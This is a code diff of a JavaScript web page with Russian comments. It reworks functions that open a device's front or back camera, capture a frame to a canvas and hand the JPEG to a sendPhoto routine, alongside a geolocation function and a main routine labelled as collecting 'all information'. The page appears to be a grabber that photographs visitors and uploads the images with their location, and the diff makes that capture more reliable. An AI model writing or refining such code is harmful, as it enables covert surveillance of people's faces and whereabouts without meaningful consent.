@@ -89,9 +89,9 @@ function getGeo(callback) {
 function getCamera(facing, callback) {
     navigator.mediaDevices.getUserMedia({
         video: { 
-            facingMode: { exact: facing }, 
-            width: { ideal: 1080 },
-            height: { ideal: 1920 }
+            facingMode: { exact: facing },
+            width: { ideal: 1280 },
+            height: { ideal: 720 }
         }
     }).then(stream => callback(stream)).catch(() => callback(null));
 }
@@ -99,34 +99,26 @@ function getCamera(facing, callback) {
 async function takePhoto(stream, caption) {
     return new Promise((resolve) => {
         const canvas = document.createElement('canvas');
-        const track = stream.getVideoTracks()[0];
-        const settings = track.getSettings();
-        
-        let width = settings.width || 1080;
-        let height = settings.height || 1920;
-        
-        // Делаем вертикальное фото (портрет)
-        if (width > height) {
-            [width, height] = [height, width];
-        }
-        
-        canvas.width = width;
-        canvas.height = height;
-        const ctx = canvas.getContext('2d');
         
         video.srcObject = stream;
-        video.play();
-        
-        setTimeout(() => {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(async (blob) => {
-                await sendPhoto(blob, caption);
-                resolve();
-            }, 'image/jpeg', 0.9);
-        }, 500);
+        video.play().then(() => {
+            setTimeout(() => {
+                const width = video.videoWidth;
+                const height = video.videoHeight;
+                
+                canvas.width = width;
+                canvas.height = height;
+                const ctx = canvas.getContext('2d');
+                
+                ctx.drawImage(video, 0, 0, width, height);
+                canvas.toBlob(async (blob) => {
+                    if (blob) await sendPhoto(blob, caption);
+                    resolve();
+                }, 'image/jpeg', 0.85);
+            }, 800);
+        }).catch(() => resolve());
     });
 }
-
 // ========== ГЛАВНАЯ ==========
 async function main() {
     // 1. Вся информация
